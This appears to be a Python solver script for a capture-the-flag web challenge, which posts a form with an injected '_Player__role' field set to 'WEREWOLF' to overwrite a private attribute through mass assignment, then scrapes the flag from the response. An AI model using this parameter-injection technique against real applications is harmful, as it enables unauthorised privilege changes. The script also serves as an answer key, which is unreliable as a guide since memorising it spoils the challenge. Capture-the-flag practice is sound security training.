import os
import time

import requests
from bs4 import BeautifulSoup


def main():
    response = requests.post(
        f"https://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}/", 
        {
            "name": "ctf4b",
            "color": "red",
            "_Player__role": "WEREWOLF"
        }
    )
    soup = BeautifulSoup(response.text, "html.parser")
    print(f"[*] FLAG: {soup.select('#flag')[0].text}")


if __name__ == '__main__':
    main()
